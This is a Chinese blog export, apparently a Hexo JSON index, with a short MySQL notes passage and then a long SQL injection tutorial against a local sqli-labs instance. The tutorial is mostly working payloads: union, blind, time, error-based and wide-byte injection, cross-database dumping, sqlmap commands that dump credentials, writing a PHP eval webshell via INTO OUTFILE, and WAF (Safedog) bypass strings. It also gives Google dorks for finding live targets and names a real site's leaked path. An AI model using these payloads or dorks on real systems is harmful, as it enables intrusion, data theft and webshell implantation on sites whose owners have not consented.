bo.boyName&#x3D;&#39;黄晓明&#39;; 方式二:truncate语句123案例:将魅力值&gt;100的男神信息删除# truncate的意思是全部清空，后面不能加where筛选，所以不能将&gt;100的信息删除truncate table boys; 12345delete和truncate的区别1、delete可以加where条件，truncate不能加2、truncate删除效率高一点3、假如要删除的表中有自增长列,如果用delete删除后，在插入数据，自增长列的值从断点开始，而truncate删除后，在插入数据，自增长列的值从1开始4、truncate删除后没有返回值，delete删除后有返回值 例题: 创建表 插入内容12345678向my_employees表插入内容方式一:mysql&gt; insert into my_employees -&gt; values(1,&#39;patel&#39;,&#39;Ralph&#39;,&#39;Rpatel&#39;,&#39;895&#39;), -&gt; (2,&#39;Dancs&#39;,&#39;Betty&#39;,&#39;Bdancs&#39;,860), -&gt; (3,&#39;Biri&#39;,&#39;Ben&#39;,&#39;Bbiri&#39;,1100), -&gt; (4,&#39;Newman&#39;,&#39;Chad&#39;,&#39;Cnewman&#39;,750), -&gt; (5,&#39;Ropeburn&#39;,&#39;Audrey&#39;,&#39;Aropebur&#39;,1550); 12345678方式二:mysql&gt; insert into my_employees -&gt; select 1,&#39;patel&#39;,&#39;Ralph&#39;,&#39;Rpatel&#39;,&#39;895&#39; union -&gt; select 2,&#39;Dancs&#39;,&#39;Betty&#39;,&#39;Bdancs&#39;,860 union -&gt; select 3,&#39;Biri&#39;,&#39;Ben&#39;,&#39;Bbiri&#39;,1100 union -&gt; select 4,&#39;Newman&#39;,&#39;Chad&#39;,&#39;Cnewman&#39;,750 union -&gt; select 5,&#39;Ropeburn&#39;,&#39;Audrey&#39;,&#39;Aropebur&#39;,1550;Query OK, 5 rows affected (0.00 sec) 12345678向users表插入内容mysql&gt; insert into users -&gt; values(1,&#39;Rpatel&#39;,10), -&gt; (2,&#39;Bdancs&#39;,10), -&gt; (3,&#39;Bbiri&#39;,20), -&gt; (4,&#39;Cnewman&#39;,30), -&gt; (5,&#39;Aropebur&#39;,40);Query OK, 5 rows affected (0.00 sec)","categories":[],"tags":[]},{"title":"sql注入","slug":"sql注入","date":"2020-04-03T06:09:55.917Z","updated":"2020-04-03T06:21:11.370Z","comments":true,"path":"2020/04/03/sql注入/","link":"","permalink":"https://zhanqiaozai.github.io/2020/04/03/sql%E6%B3%A8%E5%85%A5/","excerpt":"","text":"sql注入sql注入SQL注入就是指Web应用程序对用户输入数据的合法性没有判断，前端传入后端的参数是攻击者可控的，并且参数代入数据库查询，攻击者可以通过构造不同的sql语句来实现对数据库的任意操作 SQL注入原理SQL注入的而产生的需要满足两个条件： 参数用户可控：前端传给后端的参数内容是用户可以控制的 参数代入数据库查询：传入的参数拼接到SQL语句查询，且带入数据库查询 当传入的参数为1’时,数据库执行代码如下1select * from users where id&#x3D;1&#39; 这不符合数据库语法规范，所以会报错，传入参数and 1=1时，执行的SQL语句如下1select * from users where id&#x3D;1 and 1&#x3D;1 因为1=1为真，where语句中id=1也为真，页面返回与id=1相同的结果。当传入参数and 1=2 时，1=2不成立，返回与id=1不同的结果。由此可以判断ID参数存在sql注入。 SQL注入相关知识在mysql5.0版本后，默认在数据库有一个information_schema的库，要记住其中三个表名， 分别是SCHEMATA(schemata)、TABLES(tables)、COLUMNS(columns)。 SCHEMATA表存储该用户创建的所有数据库的库名，该表中记录数据库字段的名为SCHEMA_NAME(schema_name) TABLES表存储该用户创建的所有数据库的库名和表名，该表中记录数据库库名和表名的字段，分别为TABLE_SHCEMA(table_schema)和TABLE_NAME(table_name) COLUMNS表存储该用户创建的所有数据库的库名、表名和字段名，该表中记录数据库库名、表名和字段名的字段为，TABLE_SCHEMA(table_schema)、TABLE_NAME(table_name)、COLUMN_NAME(column_name) 需要记住的几个函数 database()查看当前数据库 version()查看当前版本 user()查看当前用户 注释符MySQL中常见注释符的表达方式：#–空格或/* */ Union注入Union注入也叫联合注入http://127.0.0.1/Less-1/?id=1测试地址 测试当前页面出错信息123456789当1&#x3D;1的时候为真返回正确页面http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1 and 1&#x3D;1但1&#x3D;2时返回还是正确页面，http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1 and 1&#x3D;2&#39;所以可以尝试在id&#x3D;1后面加上单引号&#39; ，id&#x3D;1&#39;http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1&#39;这里报错了，说明存在注入点 123456使用order by 查询字段数，因为使用单引号了&#39; 所以要用注释符注释一下，我们这里可以用# 也可以用--+其中%23代表#井号http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1&#39; order by 4%23我们发现出错了，说没有4这个列 12345这里我们尝试一下3看看有没有这个列http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1&#39; order by 3%23页面返回正常，说明字段数是3 12345我们这里使用联合查询，查看一下当前版本和库名http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1&#39; and 1&#x3D;2 union select 1,2,3%23这里返回了2和3 12345我们可以在2和3的字段上查询一下库名和版本号http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1&#39; and 1&#x3D;2 union select 1,version(),database()%23版本号是5.5.53，当前库名是security 12345我们知道了版本号和当前库名之后就要进行查询当前库中的表，因为当前版本是5.0以上所以数据库中有information_schema这个库，我们来查询一下http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1&#39; and 1&#x3D;2 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()%23这里我们查看了当前security下的表 12345在大部分情况下用户的用用户名和密码都在users表中，我们来查看一下users表http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1&#39; and 1&#x3D;2 union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39;--+发现有id，username，password，这些正是我们想要的 12345查看id，username，password字段的数据http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1&#39; and 1&#x3D;2 union select 1,2,group_concat(id,username,password) from users--+这样我们想要的数据就查询出来了 Boolean注入布尔注入，也叫盲注，这是我们的初始页面 123先测试页面报错信息http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-5&#x2F;?id&#x3D;1&#39;这里使用单引号出错了，加上注释符返回成功页面如下。 123456因为页面不能返回数据库的信息，所以我们要使用布尔盲注来进行注入首先要查询当前数据库的长度，在布尔注入中要用and来连接http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and length(database())&#x3D;9--+我们这里输入9发现错误，并没有返回You are in，我们输入8试一下。我们输入8之后页面返回乐乐You are in 说明当前数据库长度为8 知道数据库的长度了我们就要注入出数据库的名称，因为盲注不适用工具的情况下只能手动一个一个尝试，效率太慢，我们用Burp Suite进行抓包，自动筛选。 12345判断库名，我们这里用ascii码来跑，ascii码有上下限，从0-127，等号后面要跟数字，不能跟字母，当然也可以不用ascii吗，substr然后等号后面跟字符串http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-5&#x2F;?id&#x3D;-1&#39; and ascii(substr(database(),1,1))&#x3D;101--+我们这两将GET请求发送到 intruder模块下 1现将1的位置clear$掉，然后选中101进行Add$ 12现在intruder下的payloads在payload type选择Numbers起始值从0开始结束值到127每次运行间隔1，点击右上角的Start attack，去百度搜索一张ASCII码表，等一下对照 1我们发现115是s，使用相同手法只需要每次更改database()后面的1的值就行 123这里我们已经知道他的库名是security，我们要查询表名http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1,1))&#x3D;101--+然后继续抓包进行自动扫描 12这里ascii是101我们对照上面的ascii码发现是e按照之前相同步骤我们这里查询出了emails、referers、uagents、users四个表说明：查看第一个表名更改，1,1的值，想要查询下一个表名更改limit的值，limit是从0开始，1,1是从1开始 1查询出了表我们查询字段，查看users的字段 123456789我们看到结果是105对应ascii码是i，使用相同步骤继续查询，最后得出id，username，password字段查询字段数据和union一样将from后的删掉加上该加的然后查询表数据http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and ascii(substr((select (id) from users limit 0,1),1,1))&#x3D;49--+还有个时间注入效率非常慢，能不用时间注入就不用,这里演示的是查询他的库名，表名和字段名跟union一样http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and if(ascii(substr(database(),1,1))&#x3D;115,sleep(3),1)--+ 报错注入什么时候需要报错注入 在实际场景中，如果没有一个合适的数据返回点，而是仅仅带入sql数据库查询，就需要报错注入 SELECT * FROM users WHERE id=’$id’ LIMIT 0,1 正常进行绕过，但是在Less-5没有数据回显，断定为报错注入 123456789101112131415161718191、updatexml0x7e编码是~的解码形式，可以理解为，让后台xml故意报错concat就是排序这是查看当前数据库http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+进一步获取表名，列名，数据。。。在报错注入的情况下不能使用union select，只能使用select来查询语句 之前用union获取表名union select 1,group_concat(table_name),3 from information_schema.tables where table_schem&#x3D;&#39;security&#39;报错注入and undatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema&#x3D;&#39;seurity&#39; limit 0,1),0x7e),1)因为使用了limit如果数据库内容少的话可以手动一个一个加，但是如果数据库有几百条的话，就不能手动加了，效率太慢，可以使用burp，抓包发送的intruder模块然后$clear清除，将limit第一个值$add一下，选择Payload模块里面的Number设置值，进行攻击2、extractvalue对数据库让他进行一个xml文档的故意报错利用这种方式面对后台进行一个排序，指定第一个参数为null，让他故意报错，将第二个参数的语句带入数据库执行and extractvalue(null,concat(0x7e,(select database()),0x7e)) 加解密注入很多情况下，网站管理员会对传进的参数进行一个加密的操作，加密很可能自己写，也有可能base64，md5等， 1234在百度搜索以下代码之后会出现一些网址，随便进一个就行inurl:Mw&#x3D;&#x3D;划横线的地方就是典型的base64编码，我们将这一小段代码复制，然后用转换公爵转换一下 发现将这段代码转后之后变成了1230243，这就是base64解密之后的结果 这里我们将sqli-labs的第一关稍微改造一下，将其改造成base64的注入，我们在他$id的位置加上base64_decoder()然后将GET请求放到这个函数中，保存 打开sqli-labs还是传入?id=1，我们发现页面跟之前的sqli-显示不一样了，因为我们改为了base64编码，所以如果想要显示将1转换成base64编码 这里我们将1转成base64编码后成功显示了这就是加解密最简单的演示，想要查看其它内容步骤相同，都在加解密中将内容加密然后输出 宽字节注入在很多情况下，’为了安全经常会替换成/‘符号进入后台 当输入id=1’加上单引号的时候会爆出一个反斜杠的错误，这样，我们传入的单引号被转义了，无法逃逸单引号的包围，一般情况下是不存在SQL注入漏洞的，不过有一个特例就是当数据库的编码为GBK编码时，可以使用宽字节注入。 %df是β的URL编码 宽字节的格式是在地址后面加一个%df再加单引号，因为反斜杠的编码是%5c而在GBK中%df%5c是繁体字連，所以这个时候单引号成功逃逸，报出mysql 的错误 之后的查询跟union一样 12这里查看的是表名，http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-32&#x2F;?id&#x3D;1%df&#39; and 1&#x3D;2 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()--+ 跨库注入如果要应用跨库注入，有一个条件，那就是当前数据库用户为root用户，才可以对整个数据库进行操作 确定用户：user() 确定用户 如果回显root@localhost或者root@127.0.0.1只要@前面是root那就是root用户123跟union查询一样，先获取字段，然后再返回数字位置查看当前用户http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1&#39; and 1&#x3D;2 union select 1,2,user()--+ 因为@前是root，所以我们可以进行一个跨库注入 获取数据库过程：第一步：获取当前所有数据库存有所有数据库的表名为： information_schema.schemata 存储所有数据库schema_name 获取数据库名1http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1&#39; and 1&#x3D;2 union select 1,2,group_concat(schema_name) from information_schema.schemata--+ 这里我们获取myemployees库里的表1http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1&#39; and 1&#x3D;2 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;myemployees&#39;--+ 获取当前字段1http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1&#39; and 1&#x3D;2 union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;employees&#39; and table_schema&#x3D;&#39;myemployees&#39;--+ 获取department表的数据1http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1&#39; and 1&#x3D;2 union select 1,2,group_concat(location_id) from myemployees.departments--+ 跨库注入和普通注入的区别 跨库注入首先要获取所有数据库名称 在查询表名，字段名，必须限定你的要注入的数据库名称 mysql高权限用户注入getshell mysql注入高权限文件操作目的：发现了注入点，还想进一步渗透，写入文件来getshell写入PHP EVAL 一句话木马 写入php一句木马有一个前提：我们的木马必须被mysql允许上传，设置secure_file_priv=为空 secure_file_priv 是可以绕过的(通过mysql的日态文件来进行绕过，有一个前提，网站必须开启这个日态功能，如果没有开启，就不许有一个执行sql语句的地方) 写入文件sql labs第七关 文件写入sql语句绕过分析12345将引号里的id删除SELECT * FROM users WHERE id&#x3D;( (&#39; $id &#39; ) )加上 &#39;))--+SELECT * FROM users WHERE id&#x3D;( (&#39; &#39;))--+ &#39; ) ) 在sqli labs里面尝试写入1http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-7&#x2F;?id&#x3D;&#39;))union 1,2,3--+ 这里并没有响应，文件写入注入点，一定没有反应 文件写入语句: 1union select 1,2,3 在这个2中使用单引号写入你想写入的东西 12这里我们直接使用一句话木马进行上传,这里最后是路径，路径必须存才否则报错，这里必须用双斜杠，因为单斜杠会被转义union select 1,&#39;&lt;?php eval($_POST[&quot;pass&quot;])?&gt;&#39;,3 into outfile &#39;D:\\\\1\\\\1.php&#39; 在这种情况下，我们知道对方网站的路径，但是，在实际渗透中，我们并不知道这个值，怎么办。1、通过错误爆出路径123这两个命令可以再百度查看一些错误网页信息inurl:php warninginurl:edu.cn warning 网站 错误信息 www.doushanedu.cn/ /www/wwwroot/zhanqun/data/function.php 2、通过对方网站遗留文件爆出路径常见的遗留的phpinfor.php文件 3、通过漏洞爆出路径discuz爆出路径 4、根据对方web服务器类型猜解路径IIS:\\inetpub\\wwwroot\\ PHPSTUDY2020:\\phpstudy pro\\www PHPSTUDY2018:\\phpStudy\\PHPTutorial\\WWW 只要爆出来路径，并且secure_file_priv为空，即可写入文件getshell sqlmap爆出库名1sqlmap.py http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1 --dbs 爆出想要查询数据库的表名，这里查询security1sqlmap.py http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1 -D security --tables 爆出字段，这里查询users表1sqlmap.py http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1 -D security -T users --columns 爆出数据，这里查询password，username，这里使用–dump 荡出整个数据库1sqlmap.py http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1 -D security -T users -C password,username --dump 还可以使用sqlmap查看当前用户1sqlmap.py http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1 --users 如果用户为root用户可以查询数据库密码1sqlmap.py http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1 --password 爆出以上加密密码，使用md5在线解密，查看密码12*81F5E21E35407D884A6CD4A731AEBFB6AF209E1B查看这个解密之后的值，可以看到，当前数据库密码为root 查看当前数据库1sqlmap.py -u &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1&quot; --current-db 注意：sqlmap虽然好用，但必须明白其中的原理，否则挖掘0day漏洞时，会不知所措，不要成为只会用神器的”脚本小子”之前都是以GET请求注入，我们现在要以多种请求注入请求方式GET 最常见的请求方式POST 一般用于登录框COOKIE 想用哪里用哪里POST请求注入确定字段数 只需要在登录框提交sql注入语句123这里测试了，他的字段数是2例如：-1&#39; order by 2 1234查看当前数据库-1&#39; union select 1,database() #后面查询跟Union相同 COOKIE请求注入如果获取到cookie呢？可以使用burp抓包，然后在cookie后写入sql注入语句 1这里用-1&#39; order by 3 # 查看字段是是否是3，发现页面返回正常 1查看-1&#39; order by 4 # 字段4是否是正常，页面返回错误，我们可以确定字段是3 查看当前库名1-1&#39; union select 1,2,database()# 查看当前库名，如果要查询表名和字段名数据，和union注入相同 HTTP头部注入如果user-Agent这里，如果添加一个sql查询，就可以通过user-Agent进行sql注入 参数类型注入(三种)1、数字型1234语句：select * from mars where id&#x3D;1连接后就构造成了sql语句的查询连接：select * from mars where id&#x3D;-1 union select 1,database(),user() 1ID：-1 union select 1,database(),user() 2、字符型123语句：select * from mars where id&#x3D;&#39;mars&#39;连接：select * from mars where id&#x3D;&#39;-1’ union select 1,database(),user()--+&#39; 1ID：-1’ union select 1,database(),user()--+ 3、搜索型1234语句：select * from mars where mars like id&#x3D;&#39;%a%&#39;%&#39;闭合前面，后面虽然也可以用注释符注释掉但不推荐 还是用&#39;%来将其闭合，中间剩下的就是sql注入语句连接：select * from mars where mars like id&#x3D;&#39;%%&#39; union select 1,database(),user()&#39;%%&#39; 1ID：%&#39; union select 1,database(),user()&#39;% 绕过过滤注释符号的注入如果过滤注释符号 使用preg_replace函数 注释注入在这里就不工作了，怎么办呢？ 注入，不一定使用注释，也可以使用闭合 闭合不好之处就是，执行点少 1这里使用--+还是返回正确页面，因为网页将注释符给过滤掉了 12345678使用union select强制闭合$sql &#x3D; select * from users where id&#x3D;&#39;$id&#39;payload:-1&#39; union select 1,2,&#39;3我们来进行一个带入可以看到，带入之后-1被闭合了，3被闭合了，所以我们只有在2的位置进行一个sql语句执行点只有2，因为1被省略了网站不显示，3被闭合了不能使用$sql &#x3D; select * from users where id&#x3D;&#39;-1&#39; union select 1,2,&#39;3&#39; 123456还有一种就是 or 闭合select * from users where id&#x3D;&#39;$id&#39;plyload:-1&#39; union select 1,2,3 or &#39;1&#39;&#x3D;&#39;1这里还是 -1闭合了，or后面的全部闭合了，执行中间的一部分，带入：select * from users where id&#x3D;&#39;-1&#39; union select 1,2,3 or &#39;1&#39;&#x3D;&#39;1&#39; 1虽然执行中间一部分就是union select 1,2,3，但是可控点还是只有2，只能在2的位置进行查询 扩展思考搜索性注入 select * from users where username like ‘%mysql%’ 两种方法 第一种：注释 %’ union select 1,2,3 –+ 第二种：闭合 %’ union select 1,2,3 ‘% 过安全狗安全狗(waf)，也被称为网站应用级入侵防御系统，就是可以通过一些过滤来达到攻击效果安装http://free.safedog.cn/website_safedog.html 注意：一定要改成系统服务 1我们可以看到正常输入网址已经被拦截了，我们可以输出union select 发现页面还是显示防火墙，然后将a加入到union和select发现出错了，表示防火墙拦截的不是union也不是select而是拦截的 union select他们的一个整体 首先要判断安全狗识别的是哪一个关键字，怎么判断，在前面加上，干扰字符，比如a 判断安全狗拦截的union select 而并非union和select 我们看到aselect不会被拦截如何让aselect不执行给安全狗看 /* ! */符号是mysql一个特性就是，安全狗他在士必得时候会认为这是一个注释，不会对系统造成畏寒，所以，安全狗就不去拦截。 12http:127.0.0.1&#x2F;Less-2&#x2F;?id&#x3D;-1 union &#x2F;*select*&#x2F;1,2,3我们发现使用注释之后安全狗还进行拦截，怎么办呢 让aselect中a执行给安全狗看，实际执行的是select %0a 换行 %23 注释 让a单独在一行，然后把这个a注释掉，select是不是就正常执行了，安全狗这边会认为是一个正常的注释，不会拦截 payload：-1 union %23a%0a//select/1,2,3 12http:127.0.0.1&#x2F;Less-2&#x2F;?id&#x3D;-1 union %23a%0a&#x2F;*select*&#x2F;1,2,3这里我们发现了我们成功地绕过了安全狗的拦截 如果我们要查询数据库，还是按照之前的直接在2的位置打上database()是会被安全狗拦截的，所以我们判断安全狗拦截的是那一块内容，我们尝试在database(a)的括号里面加上一个a试试 12http:127.0.0.1&#x2F;Less-2&#x2F;?id&#x3D;-1 union %23a%0a&#x2F;*select*&#x2F;1,database(a),3发现报错了，表示括号里的a没有被拦截，我们就可以判断安全狗拦截的是database而不是括号 12所以我将其database和()括号分开http:127.0.0.1&#x2F;Less-2&#x2F;?id&#x3D;-1 union %23a%0a&#x2F;*select*&#x2F;1,&#x2F;*!database*&#x2F;&#x2F;*!()*&#x2F;,3 123我们发现还拦截，所以我们就可以按照之前换行，注释a换行database的方法来将database显示出来http:127.0.0.1&#x2F;Less-2&#x2F;?id&#x3D;-1 union %23a%0a&#x2F;*select*&#x2F;1,%23a%0a&#x2F;*!database*&#x2F;&#x2F;*!()*&#x2F;,3我们发现成功地返回了我们的库名，也就说明了安全狗没有去拦截这样的一个函数 12http:127.0.0.1&#x2F;Less-2&#x2F;?id&#x3D;-1 union %23a%0a&#x2F;*select*&#x2F;1,group_concat table_name from information_schema.schemata,3我们可以在每个函数里面都放一个a查看哪一个函数被拦截，之后经过测试from被拦截了，其他都没有被拦截然后我们可以将from进行a注释换行 1234先尝试&#x2F;*!from*&#x2F;如果被拦截还是用%23a%0a&#x2F;*!from*&#x2F;http:127.0.0.1&#x2F;Less-2&#x2F;?id&#x3D;-1 union %23a%0a&#x2F;*select*&#x2F;1,group_concat table_name %23a%0a&#x2F;*!from*&#x2F; information_schema.schemata,3我们发现成功地将内容显示出来了 获取一下表名 12http:127.0.0.1&#x2F;Less-2&#x2F;?id&#x3D;-1 union %23a%0a&#x2F;*select*&#x2F;1,group_concat table_name %23a%0a&#x2F;*!from*&#x2F; information_schema.tables where table_schema&#x3D;&#39;security&#39;,3直接返回成功，where并没有被拦截 安全狗防御防御效果很low。实际情况下，安全狗用的是最多的，但是，也是最好过的 安全狗，aliyundun，很好过，但是Godaddy很难过 mysql版本判断特性 /* 44509select */在mysql中不会进行报错的，这个44509是mysql的一个正常的判断，当mysql的版本大于44509就会执行select语句 1http:127.0.0.1&#x2F;Less-2&#x2F;?id&#x3D;-1 union &#x2F;*44509select*&#x2F; 1,2,3","categories":[],"tags":[]}],"categories":[],"tags":[]}